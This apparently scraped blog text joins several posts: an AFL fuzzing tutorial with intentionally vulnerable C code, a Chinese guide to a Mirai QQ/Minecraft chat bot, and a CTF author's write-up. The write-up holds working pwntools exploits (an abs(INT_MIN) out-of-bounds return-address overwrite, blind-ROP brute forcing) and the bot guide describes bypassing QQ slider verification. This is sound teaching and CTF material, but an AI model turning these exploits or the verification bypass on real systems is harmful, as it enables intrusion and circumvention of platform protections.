according to the documents. When I was doing this, I got some errors and managed to fix them as follows. Remember to find your own path to the following to walk around some Ubuntu annoyances, otherwise you will get the error indicating you are using the outdated clang and llvm. It worked for me on Ubuntu 20.04 $ sudo update-alternatives --install /usr/bin/clang clang /usr/bin/clang-11 1 $ sudo update-alternatives --install /usr/bin/clang++ clang++ /usr/bin/clang++-11 1 $ sudo update-alternatives --install /usr/bin/llvm-config llvm-config /usr/bin/llvm-config-11 1 $ sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer /usr/bin/llvm-symbolizer-11 1 While trying to start the AFL, I got this which meant that the crashes were not reported to AFL but to the system which is quite normal, so just get the root privilege and do what it said. echo core \u003e /proc/sys/kernel/core_pattern Finally, I got to start. Checking for the crashes results, we did find 5 bugs. x1do0@x1do0:~/fuzzing/afl-training/quickstart/out/default/crashes$ ls -la total 32 drwx------ 2 x1do0 x1do0 4096 Nov 8 04:52 . drwx------ 6 x1do0 x1do0 4096 Nov 8 05:04 .. -rw------- 1 x1do0 x1do0 29 Nov 8 04:06 id:000000,sig:11,src:000001,time:865,op:havoc,rep:2 -rw------- 1 x1do0 x1do0 36 Nov 8 04:06 id:000001,sig:06,src:000009,time:3487,op:havoc,rep:2 -rw------- 1 x1do0 x1do0 36 Nov 8 04:06 id:000002,sig:11,src:000006+000003,time:5027,op:splice,rep:8 -rw------- 1 x1do0 x1do0 39 Nov 8 04:06 id:000003,sig:06,src:000005,time:5202,op:havoc,rep:16 -rw------- 1 x1do0 x1do0 210 Nov 8 04:25 id:000004,sig:06,src:000006,time:1182862,op:havoc,rep:4 -rw------- 1 x1do0 x1do0 556 Nov 8 04:06 README.txt x1do0@x1do0:~/fuzzing/afl-training/quickstart$ cat ./out/default/crashes/id:000000,sig:11,src:000001,time:865,op:havoc,rep:2 head 21111\u0004�1111111111111110 x1do0@x1do0:~/fuzzing/afl-training/quickstart$ ./vulnerable \u003c ./out/default/crashes/id:000000,sig:11,src:000001,time:865,op:havoc,rep:2865,op:havoc,rep:2 Segmentation fault I could only find 3 bugs in short time after changing the input example provided. x1do0@x1do0:~/fuzzing/afl-training/quickstart/out2/default/crashes$ ls -la total 24 drwx------ 2 x1do0 x1do0 4096 Nov 8 09:36 . drwx------ 6 x1do0 x1do0 4096 Nov 8 09:39 .. -rw------- 1 x1do0 x1do0 45 Nov 8 09:36 id:000000,sig:06,src:000003,time:3711,op:havoc,rep:32 -rw------- 1 x1do0 x1do0 27 Nov 8 09:36 id:000001,sig:11,src:000003,time:5635,op:havoc,rep:2 -rw------- 1 x1do0 x1do0 42 Nov 8 09:36 id:000002,sig:06,src:000012+000005,time:6503,op:splice,rep:16 -rw------- 1 x1do0 x1do0 557 Nov 8 09:36 README.txt Up to now you can read the resource code to check the bugs. But here what I want to say is, at this time we don’t need to write a harness(see the following section), because the program itself uses stdin to receive inputs. // vulnerable.c int main(int argc, char *argv[]) { char *usage = \"Usage: %s\\n\" \"Text utility - accepts commands and data on stdin and prints results to stdout.\\n\" \"\\tInput | Output\\n\" \"\\t------------------+-----------------------\\n\" \"\\tu \u003cN\u003e \u003cstring\u003e | Uppercased version of the first \u003cN\u003e bytes of \u003cstring\u003e.\\n\" \"\\thead \u003cN\u003e \u003cstring\u003e | The first \u003cN\u003e bytes of \u003cstring\u003e.\\n\"; char input[INPUTSIZE] = {0}; // Slurp input if (read(STDIN_FILENO, input, INPUTSIZE) \u003c 0) { fprintf(stderr, \"Couldn't read stdin.\\n\"); } int ret = process(input); if (ret) { fprintf(stderr, usage, argv[0]); }; return ret; } Let’s consider the startup command for AFL, we can see that AFL regard inputs as seeds and send to stdin of the tested program vulnerable. alf-fuzz -i inputs -o out ./vulnerable ","date":"2021-11-13","objectID":"/2021/11/fuzzing1/:0:2","tags":null,"title":"American Fuzzy Lop tutorial-basic","uri":"/2021/11/fuzzing1/"},{"categories":["course"],"content":"Harness In this section, we will encounter some kinds of situation where there is nowhere to send input using AFL, which makes writing a harness program is a must. The example program about to test contains just two functions implemented, we should at least write a main to call these functions instead of throwing it directly to AFL. // library.c #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cassert.h\u003e #include \"library.h\" void lib_echo(char *data, ssize_t len){ if(strlen(data) == 0) { return; } char *buf = calloc(1, len); strncpy(buf, data, len); printf(\"%s\",buf); free(buf); // A crash so we can tell the harness is working for lib_echo if(data[0] == 'p') { if(data[1] == 'o') { if(data[2] =='p') { if(data[3] == '!') { assert(0); } } } } } int lib_mul(int x, int y){ if(x%2 == 0) { return y \u003c\u003c x; } else if (y%2 == 0) { return x \u003c\u003c y; } else if (x == 0) { return 0; } else if (y == 0) { return 0; } else { return x * y; } } Use stdin to input // harness1.c #include \u003cunistd.h\u003e#include \u003cstring.h\u003e#include \u003cstdio.h\u003e #include \"library.h\" // fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function #define SIZE 100 int main(int argc, char* argv[]) { if((argc == 2) \u0026\u0026 strcmp(argv[1], \"echo\") == 0) { // make sure buffer is initialized to eliminate variable behaviour that isn't dependent on the input. char input[SIZE] = {0}; ssize_t length; length = read(STDIN_FILENO, input, SIZE); lib_echo(input, length); } else if ((argc == 2) \u0026\u0026 strcmp(argv[1], \"mul\") == 0) { int a,b = 0; read(STDIN_FILENO, \u0026a, 4); read(STDIN_FILENO, \u0026b, 4); printf(\"%d\\n\", lib_mul(a,b)); } else { printf(\"Usage: %s mul|echo\\n\", argv[0]); } } Compile it with library.c x1do0@x1do0:~/fuzzing/afl-training/harness$ AFL_HARDEN=1 afl-clang-fast harness1.c library.c -o harness1 afl-cc ++3.15a by Michal Zalewski, Laszlo Szekeres, Marc Heuse - mode: GCC_PLUGIN-DEFAULT afl-gcc-pass ++3.15a by \u003coliva@adacore.com\u003e [*] Inline instrumentation at ratio of 100% in hardened mode. harness1.c: In function ‘main’: harness1.c:21:3: warning: ignoring return value of ‘read’, declared with attribute warn_unused_result [-Wunused-result] 21 | read(STDIN_FILENO, \u0026a, 4); | ^~~~~~~~~~~~~~~~~~~~~~~~~ harness1.c:22:3: warning: ignoring return value of ‘read’, declared with attribute warn_unused_result [-Wunused-result] 22 | read(STDIN_FILENO, \u0026b, 4); | ^~~~~~~~~~~~~~~~~~~~~~~~~ harness1.c: At top level: cc1: warning: unrecognized command line option ‘-Wno-unused-command-line-argument’ [+] Instrumented 11 locations (hardened mode, inline, ratio 100%). afl-gcc-pass ++3.15a by \u003coliva@adacore.com\u003e [*] Inline instrumentation at ratio of 100% in hardened mode. [+] Instrumented 15 locations (hardened mode, inline, ratio 100%). Fuzzing like this after creating in directory # first job afl-fuzz -i in -o out ./harness1 mul # second job afl-fuzz -i in -o out ./harness echo And if we want to fuzz in one job testing both of them, we can fix size buffer based on assumptions about the size, for example using the first 8 bytes as input to lib_mul, and any remaining bytes as input to lib_echo. Use file to input At that time, honestly I didn’t understand the requests here. Left as an exercise, as reading from stdin is usually sufficient. The steps are: Read a filename from argv Open the specified file and read its contents into a buffer. Pass that buffer to the target function. If the harness opens the file according to the filename from argv and gets the content and sends to the testes program, what does AFL do in this procedure? Command here is afl-fuzz -i in -o out ./harness filename, so the input totally depends on filename, so what does in use for? I wrote a harness to test lib_echoand type afl-fuzz -i in -o out ./harness2 testInput // harness2.c #include \u003cunistd.h\u003e#include \u003cstring.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \"library.h\" // fixed size buffer int SIZE = 255; int main(int argc, char* argv[]) { if(argc == 2)","date":"2021-11-13","objectID":"/2021/11/fuzzing1/:0:3","tags":null,"title":"American Fuzzy Lop tutorial-basic","uri":"/2021/11/fuzzing1/"},{"categories":["course"],"content":"Reference [1] https://github.com/mykter/afl-training [2] https://github.com/google/AFL [3] https://bishopfox.com/blog/fuzzing-aka-fuzz-testing ","date":"2021-11-13","objectID":"/2021/11/fuzzing1/:0:4","tags":null,"title":"American Fuzzy Lop tutorial-basic","uri":"/2021/11/fuzzing1/"},{"categories":["General"],"content":"Mirai 是一个在全平台下运行，提供 QQ 协议支持的高效率机器人库。这个项目的名字来源于京都动画作品《境界的彼方》的栗山未来(Kuriyama Mirai)，本文将基于 Mirai 构建 Minecraft 与 QQ 协同的聊天机器人，需求有三 让服务器qq群与mc聊天互通 让机器人自动通报事件（比如成就、死亡等） 与机器人交互了解服务器情况（比如list显示当前服务器人数等） ","date":"2021-11-08","objectID":"/2021/11/mcbot/:0:0","tags":null,"title":"如何为 Minecraft 服务器添加一个播报员（一）","uri":"/2021/11/mcbot/"},{"categories":["General"],"content":"环境搭建 此博客提供了以python为开发语言的完整的搭建流程，由于其中某些环节的项目已经停止维护，建议配合这个清单来食用！以下是我遇到的其他问题 环境异常，以及如何绕过QQ滑块验证检测 强烈建议先在本地成功得到通过检测的/bots/qq号码/device.json后再将其拷贝到服务器上! 如果你和我一样不幸全家都是iphone用户，你可能得准备以下工具 iTunes inspect (https://inspect.dev/why) 我们的目的是拿到登录qq时验证滑块成功通过的流量，其中有个ticket就是我们想要的。iTunes帮助Windows电脑能成功连接iPhone，而Inspect可以拿到手机上的流量 剩下的就好办了，跟着做就行，把Mirai弹出来的url在手机上打开，滑动滑块的同时在Inspect上拿到result，并填入ticket后回车。这时候会再要求扫码或者弹出一个安全检测，在手机上照着做就成功了。如此，我们让一个不常用设备登录上了qq，这也是在服务器上挂qq机器人必须完成的一步。 登录一次以后每次都不用验证了，并且找到/bots/qq号码/device.json文件将其拷贝到任何设备都可以绕过验证！ 版本不匹配造成的更多错误 添加mirai-api-http并下载后发现这个错误 这是我此时的版本清单 12:02:02 [INFO] Verifying \"org.bouncycastle:bcprov-jdk15on\" v1.64 12:02:02 [INFO] Verifying \"net.mamoe:mirai-console\" v2.8.0-RC 12:02:02 [INFO] Verifying \"net.mamoe:mirai-console-terminal\" v2.8.0-RC 12:02:02 [INFO] Verifying \"net.mamoe:mirai-core-all\" v2.8.0-RC 12:02:03 [INFO] Verifying \"org.itxtech:mcl-addon\" v1.2.2 你最好立马从头开始，并使用这个清单！通过关掉updator并指定配置文件/config.json中的版本来自动下载所需版本 这是我最终的/config.json { \"js_optimization_level\": -1, \"mirai_repo\": \"https://gitee.com/peratx/mirai-repo/raw/master\", \"maven_repo\": [ \"https://maven.aliyun.com/repository/public\" ], \"packages\": [ { \"id\": \"org.bouncycastle:bcprov-jdk15on\", \"channel\": \"stable\", \"version\": \"1.64\", \"type\": \"libs\", \"versionLocked\": false }, { \"id\": \"net.mamoe:mirai-console\", \"channel\": \"beta\", \"version\": \"2.7.0\", \"type\": \"libs\", \"versionLocked\": false }, { \"id\": \"net.mamoe:mirai-console-terminal\", \"channel\": \"beta\", \"version\": \"2.7.0\", \"type\": \"libs\", \"versionLocked\": false }, { \"id\": \"net.mamoe:mirai-core-all\", \"channel\": \"beta\", \"version\": \"2.7.0\", \"type\": \"libs\", \"versionLocked\": false }, { \"id\": \"org.itxtech:mcl-addon\", \"channel\": \"c122\", \"version\": \"1.2.2\", \"type\": \"plugins\", \"versionLocked\": false }, { \"id\": \"net.mamoe:mirai-api-http\", \"channel\": \"stable\", \"version\": \"1.12.0\", \"type\": \"plugins\", \"versionLocked\": false } ], \"disabled_scripts\": [], \"proxy\": \"\", \"log_level\": 1, \"script_props\": {} } 以及/config/net.mamoe.mirai-api-http/setting.yml # 可选，默认值为0.0.0.0 host: '0.0.0.0' # # # 可选，默认值为8080 port: 8080 # # # 可选，默认由插件第一次启动时随机生成，建议手动指定 authKey: xdchaseforever # # # 可选，缓存大小，默认4096.缓存过小会导致引用回复与撤回消息失败 cacheSize: 4096 # # # 可选，是否开启websocket，默认关闭，建议通过Session范围的配置设置 enableWebsocket: true cors: - '*' ## 消息上报 report: ## 功能总开关 enable: false # 群消息上报 groupMessage: report: false # 好友消息上报 friendMessage: report: false # 临时消息上报 tempMessage: report: false # 事件上报 eventMessage: report: false # 上报URL destinations: [] # 上报时的额外Header extraHeaders: {} ## 心跳 heartbeat: # 功能总开关 enable: false # 启动延迟 delay: 1000 # 心跳间隔 period: 15000 # 心跳上报URL destinations: [] # 上报时的额外信息 extraBody: {} # 上报时的额外头 extraHeaders: {} 以下报错单纯是因为Mirai没有打开滑块验证，重新登录即可 如何用python开发 至此，其实你已经可以用java来写了，但我想用python，graia可以解决这个问题，虽然已停止维护但我在使用过程中并没有遇到问题（python3.9.7）同时graia作者指出未来的趋势为此项目，也许值得一试但我并没有尝试。 pip install graia-application-mirai 创建bot.py 并修改authenKey与QQ号 from graia.broadcast import Broadcast from graia.application import GraiaMiraiApplication, Session from graia.application.message.chain import MessageChain import asyncio from graia.application.message.elements.internal import Plain from graia.application.friend import Friend loop = asyncio.get_event_loop() bcc = Broadcast(loop=loop) app = GraiaMiraiApplication( broadcast=bcc, connect_info=Session( host=\"http://localhost:8080\", # 填入 httpapi 服务运行的地址 authKey=\"xdchaseforever\", # 填入 authKey account=dontwannatellyou, # 你的机器人的 qq 号 websocket=True # Graia 已经可以根据所配置的消息接收的方式来保证消息接收部分的正常运作. ) ) @bcc.receiver(\"FriendMessage\") async def friend_message_listener(app: GraiaMiraiApplication, friend: Friend): await app.sendFriendMessage(friend, MessageChain.create([ Plain(\"Hello, World!\") ])) app.launch_blocking() 以上代码就能实现私聊自动回复。 如何上云 其实你大可以将本地搭建好的mcl文件夹整个送上服务器，只要保证python与java环境不变，然后用 screen 将 Mirai 与 bot.py 全部挂在后台即可。 我的服务器是阿里云Debian9.9镜像，最后是这样 (base) root@iZ2zefiis08efdfsj0cydeZ:~# screen -ls There are screens on: 29765.bot (11/09/2021 05:51:43 PM) (Detached) 28393.mirai (11/09/2021 03:48:23 PM) (Detached) 2358.minecraft (11/01/2021 07:","date":"2021-11-08","objectID":"/2021/11/mcbot/:0:1","tags":null,"title":"如何为 Minecraft 服务器添加一个播报员（一）","uri":"/2021/11/mcbot/"},{"categories":["General"],"content":"今日开发进度 快速学习了一些API，参见官方文档 [https://graia-document.vercel.app/docs/guides/installation] 私聊回复 @bcc.receiver(\"FriendMessage\") async def friend_message_listener(app: GraiaMiraiApplication, friend: Friend): await app.sendFriendMessage(friend, MessageChain.create([ Plain(buf) ])) 群聊回复 @bcc.receiver(\"GroupMessage\") async def test( message: MessageChain, app: GraiaMiraiApplication, group: Group, member: Member, ): if message.asDisplay().startswith(\"!ping\"): await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain(\"pong\") ])) 由于Minecraft会自动记录日志，所以可以读取日志来响应用户 buf = \"\" def read_latest_mclog(): global buf buf = \"\" with open(PATH, \"r\") as logfile: for i in logfile: buf += i.replace(\"[Server thread/INFO]\", \"\") 然后分别解析即可。但需要改进的地方也很多，而要实现需求最重要的是如何进行实时交互。从搭建环境到这里已经花了一天时间，得赶紧爬回去准备考试和毕设了，只得草草收场。 from graia.broadcast import Broadcast from graia.application import GraiaMiraiApplication, Session from graia.application.message.chain import MessageChain from graia.application.group import Group, Member import asyncio from graia.application.message.elements.internal import Plain, At from graia.application.friend import Friend import time, os PATH = \"/root/logs/latest.log\" loop = asyncio.get_event_loop() bcc = Broadcast(loop=loop) app = GraiaMiraiApplication( broadcast=bcc, connect_info=Session( host=\"http://localhost:8080\", # 填入 httpapi 服务运行的地址 authKey=\"xdchaseforever\", # 填入 authKey account=dontwannatellyou, # 你的机器人的 qq 号 websocket=True # Graia 已经可以根据所配置的消息接收的方式来保证消息接收部分的正常运作. ) ) buf = \"\" def read_latest_mclog(): global buf buf = \"\" with open(PATH, \"r\") as logfile: for i in logfile: buf += i.replace(\"[Server thread/INFO]\", \"\") def get_list(): global buf read_latest_mclog() b = buf.split(\"\\n\") print(b) buf = \"\" for i in b: if \"joined the game\" in i or \"left the game\" in i: buf += i + '\\n' def get_event(): global buf read_latest_mclog() b = buf.split(\"\\n\") print(b) buf = \"\" for i in b: if \"advancement\" in i: buf += \" 【喜报】 \" + i + '\\n' elif \"swim in lava\" in i: buf += \" 【悲报】 \" + i + '\\n' def get_chat(): global buf read_latest_mclog() b = buf.split(\"\\n\") print(b) buf = \"\" for i in b: if \"\u003c\" in i and \"\u003e\" in i: buf += i + '\\n' @bcc.receiver(\"FriendMessage\") async def friend_message_listener(app: GraiaMiraiApplication, friend: Friend): read_latest_mclog() await app.sendFriendMessage(friend, MessageChain.create([ Plain(buf) ])) @bcc.receiver(\"GroupMessage\") async def test( message: MessageChain, app: GraiaMiraiApplication, group: Group, member: Member, ): if message.asDisplay().startswith(\"!ping\"): await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain(\"pong\") ])) elif message.asDisplay().startswith(\"!help\"): await app.sendGroupMessage(group, MessageChain.create([ Plain(\"施工中...\\nhelp 查看帮助\\nlog 查看日志详情 \\nlist 查看近期登录情况 \\nevent 查看近期事件 \\nchat 查看近期聊天内容\") ])) elif message.asDisplay().startswith(\"!log\"): read_latest_mclog() await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain('\\n'+buf) ])) elif message.asDisplay().startswith(\"!list\"): get_list() await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain('\\n'+buf) ])) elif message.asDisplay().startswith(\"!event\"): get_event() await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain('\\n'+buf) ])) elif message.asDisplay().startswith(\"!chat\"): get_chat() await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain(\"\\n\"+buf) ])) app.launch_blocking() 最终是达到了这样的效果 有空继续完善，后续细分来看需要解决如下问题 每当QQ群有消息，机器人从Mirai手中拿到消息，发给Minecraft后台，后者进一步在Minecraft中广播 若是聊天信息，直接广播即可 若是查询信息，需要从Minecraft后台拿到查询结果并返回给Mirai 每当Minecraft中有消息，机器人需要问询Minecraft后台并拿到这个消息，发送给Mirai 所以至少需要知道 Mirai如何向QQ发送消息 Minecraft后台如何向游戏内发送消息 Mirai与Minecraft后台如何交互（可能考虑重定向IO） ","date":"2021-11-08","objectID":"/2021/11/mcbot/:0:2","tags":null,"title":"如何为 Minecraft 服务器添加一个播报员（一）","uri":"/2021/11/mcbot/"},{"categories":["PWN"],"content":"前段时间还在惊讶福建为什么突然爆发疫情，转眼间哈尔滨也烂掉了。兰州聚会寄了，广州两周游也寄了，雅思寄了，GRE也寄了，只能在哈尔滨苦逼地记录一下招新赛2021出题概况与环境部署细节，看来出国壬需要具备较强的心理容错能力。 ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:0:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"默认部署环境 文件目录 Info\r\r docker-compose.yml release Dockerfile ctf.xinetd flag pwn(\u0026 lib) \r\r docker-compose.yml指定目录、端口等 version: \"3.6\" services: pwn: build: ./release restart: always ports: - \"30111-30114:8888\" deploy: resources: limits: cpus: '0.20' memory: 50M Dockerfile为docker部署脚本，包括指定gamebox版本、设置文件权限、启动服务等 FROM ubuntu:16.04 RUN sed -i \"s/http:\\/\\/archive.ubuntu.com/http:\\/\\/mirrors.tuna.tsinghua.edu.cn/g\" /etc/apt/sources.list RUN apt-get update \u0026\u0026 apt-get -y dist-upgrade RUN apt-get install -y lib32z1 xinetd RUN useradd -m ctf COPY ./flag /flag COPY ./pwn /pwn/pwn COPY ./ctf.xinetd /etc/xinetd.d/ctf RUN chown root:ctf /pwn/pwn \u0026\u0026 chmod 750 /pwn/pwn RUN chown root:ctf /flag \u0026\u0026 chmod 644 /flag RUN echo 'ctf - nproc 1500' \u003e\u003e/etc/security/limits.conf CMD exec /bin/bash -c \"/etc/init.d/xinetd start; trap : TERM INT; sleep infinity \u0026 wait\" EXPOSE 8888 ctf.xinetd有更详细的启动参数，一般只需要注意server_args设定pwn题启动命令与超时时间等 service ctf { disable = no socket_type = stream protocol = tcp wait = no user = root type = UNLISTED port = 8888 bind = 0.0.0.0 server = /usr/sbin/chroot server_args = --userspec=1000:1000 / timeout 120 ./pwn/pwn banner_fail = /etc/banner_fail # safety options per_source = 10 # the maximum instances of this service per source IP address rlimit_cpu = 60 # the maximum number of CPU seconds that the service may use rlimit_as = 1024M # the Address Space resource limit for the service #access_times = 2:00-9:00 12:00-24:00 #Instances = 20 #process limit #per_source = 5 #link ip limit #log warning die log_on_success = PID HOST EXIT DURATION log_on_failure = HOST ATTEMPT log_type =FILE /var/log/myservice.log 8388608 15728640 } 注意远程elf文件一定要设置缓冲区，否则选手无法交互 setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:1:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"babyFAT_revenge | 6 solves ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:2:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"环境信息 Ubuntu 16.04下编译命令 gcc ./pwn.c -o0 ./pwn 给出如下提示 try this, abs(INT_MIN) ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:2:1","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"题解 题目维护了一个链表，可以增改清空打印。 唯一的漏洞点在于write中利用abs得到在0-99范围内的整数索引。如提示所说，由于INT_MIN的绝对值比INT_MAX大一，导致在经过绝对值以后无法转换，会原封不动地输出，即 abs(INT_MIN) = INT_MIN 最终得到的索引为-30，进而导致越界读写，直接改写返回地址为后门函数即可。 给了hint以后不难做出，exp如下 from pwn import * def add(idx, ch): io.sendlineafter(\"Your choice: \", '1') io.sendlineafter(\"Index: \",str(idx)) io.sendlineafter(\"Input content: \", ch) def edit(idx, ch): io.sendlineafter(\"Your choice: \", '3') io.sendlineafter(\"Index: \",str(idx)) io.sendlineafter(\"Input content: \", ch) def exploit(offset, value): add(64, 'a') add(-2147483648, p8(offset + 0x78)) edit(offset + 0x78, value) clear() def clear(): io.sendlineafter(\"Your choice: \", '4') io = process(\"./pwn\") # io = remote(\"101.200.201.114\", 30001) sys = 0x40089D # rbp + 8 -\u003e backdoor for i in range(8): val = sys \u0026 0xff exploit(i, p8(val)) sys = sys \u003e\u003e 8 io.sendlineafter(\"Your choice: \", '5') io.interactive() flag{abs_1s_s0_1nt3rstIng} ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:2:2","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"bbBTtt | 2 solves 源自强网杯2021决赛强网先锋 本地与远程表现不一致，原因仍然未知，些许提高了利用难度 但提示已经明确给出了CVE编号，大大减少了查阅资料的时间 flag{w0w_yoUr_f1rst_nday_3xp_orzzzzz} ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:3:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"dark_fantasy | 0 solves ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:4:0","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"环境信息 Ubuntu 20.04 gcc -fno-stack-protector -no-pie pwn.c -o pwn ","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:4:1","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"题解 没有给附件，用awds代表方向键，需要连续走30个迷宫，且迷宫大小递增 x1do0@x1do0:~/linux_share/lilac_pwn/darkfantasy$ ./pwn 😭 Are you good at maze 😭 😭 Help me plz 😭 *** Maze 0 *** ⬜⬛⬜⬜⬜⬜⬜⬛⬛⬛ ⬛😀⬜⬜⬜⬜⬜⬜⬛⬛ ⬜⬜⬜⬜⬛⬜⬛⬛⬜⬜ ⬜⬜⬜⬜⬜⬜⬛⬜⬜⬜ ⬛⬛⬜⬛⬛⬜⬜⬜⬛⬜ ⬛⬛⬜⬜⬛⬛⬜⬛⬛⬜ ⬛⬛⬜⬛⬛⬛⬛⬛⬜⬜ ⬛⬛⬛⬜⬜⬛⬛⬛⬜⬜ ⬛⬜⬜⬛⬜⬜⬛⬜🚩⬜ ⬛⬜⬛⬛⬜⬛⬜⬜⬜⬛ Input your path ssddddsddwddsssass [3][2]-\u003e[4][2]-\u003e[4][3]-\u003e[4][4]-\u003e[4][5]-\u003e[4][6]-\u003e[5][6]-\u003e[5][7]-\u003e[5][8]-\u003e[4][8]-\u003e[4][9]-\u003e[4][10]-\u003e[5][10]-\u003e[6][10]-\u003e[7][10]-\u003e[7][9]-\u003e[8][9]-\u003e[9][9]-\u003e[9][9]-\u003e😄 Solved...Thank you sooo much! *** Maze 1 *** ⬛⬜⬜⬜⬛⬛⬜⬛⬜⬜⬜ ⬜😀⬜⬜⬜⬜⬛⬛⬜⬜⬜ ⬛⬜⬛⬜⬜⬛⬛⬜⬛⬛⬜ ⬛⬜⬛⬜⬜⬛⬛⬜⬜⬜⬛ ⬜⬜⬛⬜⬜⬛⬜⬜⬛⬜⬜ ⬛⬜⬜⬜⬛⬛⬜⬜⬜⬛⬜ ⬜⬜⬜⬛⬜⬛⬛⬛⬛⬜⬜ ⬛⬛⬜⬜⬛⬜⬛⬛⬛⬛⬛ ⬜⬛⬛⬜⬜⬜⬜⬜⬜⬜⬜ ⬛⬛⬛⬛⬛⬜⬜⬛⬜🚩⬜ ⬜⬛⬛⬛⬛⬛⬛⬜⬛⬛⬜ Input your path 写个脚本用dfs走走迷宫吧，走完以后给了一个栈溢出（选手可能并不知道是否溢出） void next_challenge() { char name[0x20]; puts(\"Okay there you are, coooool!\"); puts(\"Leave your name in Lilac Hall of Fame😀\"); read(0, name, 0x100); puts(\"Glad you come~\"); } 输入完就结束了，当选手望着已经结束的程序发愣时他理应想到这题不只是想让他走个迷宫 后续就是经典的Blind-ROP，思路如下 找main_addr，爆到能重新输入的地址（可以不是main） 找gadgets，在init函数的连续六个pop并ret（+9就是pop rdi ret) 找打印函数，爆到能把0x400000打印（可以不是puts） 利用打印函数从头到尾把程序dump下来（dump到plt就行，拿到got地址） ROP 完整exp \"\"\" x1do0 / Lilac \"\"\" from pwn import * import numpy as np def generate_map(level, io): size = level + 10 startX = 0 startY = 0 endX = 0 endY = 0 mapStatus = np.zeros((size, size, 2), dtype=np.uint8) for i in range(size): s = io.recvuntil('\\n',drop=True) cnt = 0 for j in range(size): if s[cnt:cnt+3] == b\"\\xe2\\xac\\x9c\" : mapStatus[i,j,0]=1 cnt += 3 elif s[cnt:cnt+3] == b\"\\xe2\\xac\\x9b\" : cnt += 3 continue elif s[cnt:cnt+4] == b'\\xf0\\x9f\\x9a\\xa9': cnt += 4 mapStatus[i,j,0]=1 endX = i endY = j elif s[cnt:cnt+4] == b'\\xf0\\x9f\\x98\\x80': cnt += 4 startX = i startY = j else : print(\"error in ({},{}):{}\".format(i,j,hex(ord(s[cnt])))) exit(0) return startX, startY, endX, endY, mapStatus def find_route(startX, startY, endX, endY, mapStatus, level): route = [[startX,startY]] x = startX y = startY direction = [] size = level + 10 # print(level) while x != endX or y != endY: # print(\"{},({},{})\".format(direction,x,y)) mapStatus[x,y,1] = 1 if x\u003e0: if mapStatus[x-1,y,0] == 1 and mapStatus[x-1,y,1] == 0: x = x - 1 route.append([x,y]) direction.append('w') continue if x\u003csize-1: if mapStatus[x+1,y,0] == 1 and mapStatus[x+1,y,1] == 0: x = x + 1 route.append([x,y]) direction.append('s') continue if y\u003e0: if mapStatus[x,y-1,0] == 1 and mapStatus[x,y-1,1] == 0: y = y - 1 route.append([x,y]) direction.append('a') continue if y\u003csize-1: if mapStatus[x,y+1,0] == 1 and mapStatus[x,y+1,1] == 0: y = y + 1 route.append([x,y]) direction.append('d') continue route.pop() direction.pop() x,y = route.pop() route.append([x,y]) # print(\"round{} finished!\".format(level)) return direction def test_map(startX, startY, endX, endY, mapStatus, level): print(\"round{}:\".format(level)) print(\"start point:{},{}\".format(startX,startY)) print(\"end point:{},{}\".format(endX,endY)) for i in range(level+10): for j in range(level+10): print(\"{}\".format(mapStatus[i,j,0]), end=''), print(\"\") def solve_maze(io): for i in range(10, 30): io.recvuntil(\"*** Maze \") level = int(io.recvuntil(\" ***\", drop=True), 10) io.recvuntil(\"\\n\") startX, startY, endX, endY, mapStatus = generate_map(level, io) # test_map(startX, startY, endX, endY, mapStatus, level) direction = find_route(startX, startY, endX, endY, mapStatus, level) pay = '' for d in direction: pay += d io.sendline(pay) buffer_len = 0x28 main_addr = 0 gadgets_addr = 0 pop_rdi_ret_addr = 0 puts_plt_addr = 0 def GetStopAddr(): address = 0x401200 while 1: print(hex(address)) try: sh = process('./pwn') solve_maze(sh) sh.recvuntil('Leave your name in Lilac Hall of Fame') payload = b'a'*buffer_len + p64(address) sh.send(payload) sh.recvuntil('Glad you come~\\n') output = sh.recv(timeout=1) print(output) if b'Okay there you are, coooool!' not in output: sh.close() address += 1 else: return address except EOFError: address += 1 sh.close() def GetBropGadgets(buf_length, stop_gadgets, address): try: sh = process('./pwn') solve_maze(sh) sh.recvuntil('Leave your name in Lilac Hall of Fam","date":"2021-09-22","objectID":"/2021/09/lilac_ctf/:4:2","tags":null,"title":"招新赛 2021 出题总结(个人向)","uri":"/2021/09/lilac_ctf/"},{"categories":["PWN"],"content":"magic_scanf | 0 solves 由队内小伙伴出的很好的一题，这里抱着学习的态度复现一遍，环境为Ubuntu 16.04 程序功能为在堆上任意次利用scanf读入int与long long，以及一个明显的任意地址写\\x00 case '*': if (risk != NULL) break; read(STDIN_FILENO, (char *) \u0026risk, 8); *(char *) risk = '\\0'; break; 